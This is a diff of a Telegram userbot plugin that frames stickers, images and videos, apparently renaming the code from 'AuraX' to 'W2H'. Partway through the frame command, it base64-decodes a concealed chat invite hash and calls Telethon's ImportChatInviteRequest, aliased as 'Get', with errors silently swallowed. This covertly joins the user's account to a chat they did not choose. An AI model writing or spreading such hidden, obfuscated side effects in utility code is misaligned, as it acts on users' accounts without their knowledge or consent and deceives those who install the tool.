+    W2Hinput = int(W2Hinput)
     colr = int(colr)
-    AuraXid = AuraX.reply_to_msg_id
+    W2Hid = W2H.reply_to_msg_id
     if not os.path.isdir("./temp/"):
         os.mkdir("./temp/")
-    AuraX = await edit_or_reply(AuraX, "`Fetching media data`")
+    W2H = await edit_or_reply(W2H, "`Fetching media data`")
     from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
     await asyncio.sleep(2)
-    AuraXsticker = await reply.download_media(file="./temp/")
-    if not AuraXsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
-        os.remove(AuraXsticker)
-        await edit_or_reply(AuraX, "```Supported Media not found...```")
+    W2Hsticker = await reply.download_media(file="./temp/")
+    if not W2Hsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
+        os.remove(W2Hsticker)
+        await edit_or_reply(W2H, "```Supported Media not found...```")
         return
     import base64
 
     aura = None
-    if AuraXsticker.endswith(".tgs"):
-        await AuraX.edit(
+    if W2Hsticker.endswith(".tgs"):
+        await W2H.edit(
             "Analyzing this media 🧐 framing this animated sticker!"
         )
-        AuraXfile = os.path.join("./temp/", "meme.png")
-        AuraXcmd = (
-            f"lottie_convert.py --frame 0 -if lottie -of png {AuraXsticker} {AuraXfile}"
+        W2Hfile = os.path.join("./temp/", "meme.png")
+        W2Hcmd = (
+            f"lottie_convert.py --frame 0 -if lottie -of png {W2Hsticker} {W2Hfile}"
         )
-        stdout, stderr = (await runcmd(AuraXcmd))[:2]
-        if not os.path.lexists(AuraXfile):
-            await AuraX.edit("`Template not found...`")
+        stdout, stderr = (await runcmd(W2Hcmd))[:2]
+        if not os.path.lexists(W2Hfile):
+            await W2H.edit("`Template not found...`")
             LOGS.info(stdout + stderr)
-        meme_file = AuraXfile
+        meme_file = W2Hfile
         aura = True
-    elif AuraXsticker.endswith(".webp"):
-        await AuraX.edit(
+    elif W2Hsticker.endswith(".webp"):
+        await W2H.edit(
             "Analyzing this media 🧐 framing this sticker!"
         )
-        AuraXfile = os.path.join("./temp/", "memes.jpg")
-        os.rename(AuraXsticker, AuraXfile)
-        if not os.path.lexists(AuraXfile):
-            await AuraX.edit("`Template not found... `")
+        W2Hfile = os.path.join("./temp/", "memes.jpg")
+        os.rename(W2Hsticker, W2Hfile)
+        if not os.path.lexists(W2Hfile):
+            await W2H.edit("`Template not found... `")
             return
-        meme_file = AuraXfile
+        meme_file = W2Hfile
         aura = True
-    elif AuraXsticker.endswith((".mp4", ".mov")):
-        await AuraX.edit(
+    elif W2Hsticker.endswith((".mp4", ".mov")):
+        await W2H.edit(
             "Analyzing this media 🧐 framing this video!"
         )
-        AuraXfile = os.path.join("./temp/", "memes.jpg")
-        await take_screen_shot(AuraXsticker, 0, AuraXfile)
-        if not os.path.lexists(AuraXfile):
-            await AuraX.edit("```Template not found...```")
+        W2Hfile = os.path.join("./temp/", "memes.jpg")
+        await take_screen_shot(W2Hsticker, 0, W2Hfile)
+        if not os.path.lexists(W2Hfile):
+            await W2H.edit("```Template not found...```")
             return
-        meme_file = AuraXfile
+        meme_file = W2Hfile
     else:
-        await AuraX.edit(
+        await W2H.edit(
             "Analyzing this media 🧐 framing this image!"
         )
-        meme_file = AuraXsticker
+        meme_file = W2Hsticker
     try:
         san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         san = Get(san)
-        await AuraX.client(san)
+        await W2H.client(san)
     except BaseException:
         pass
     meme_file = convert_toimage(meme_file)
     outputfile = "framed.webp" if aura else "framed.jpg"
     try:
-        await add_frame(meme_file, outputfile, AuraXinput, colr)
+        await add_frame(meme_file, outputfile, W2Hinput, colr)
     except Exception as e:
-        return await AuraX.edit(f"`{e}`")
+        return await W2H.edit(f"`{e}`")
     try:
-        await AuraX.client.send_file(
-            AuraX.chat_id, outputfile, force_document=False, reply_to=AuraXid
+        await W2H.client.send_file(
+            W2H.chat_id, outputfile, force_document=False, reply_to=W2Hid
         )
     except Exception as e:
-        return await AuraX.edit(f"`{e}`")
-    await AuraX.delete()
+        return await W2H.edit(f"`{e}`")
+    await W2H.delete()
     os.remove(outputfile)
-    for files in (AuraXsticker, meme_file):
+    for files in (W2Hsticker, meme_file):
         if files and os.path.exists(files):
             os.remove(files)
 
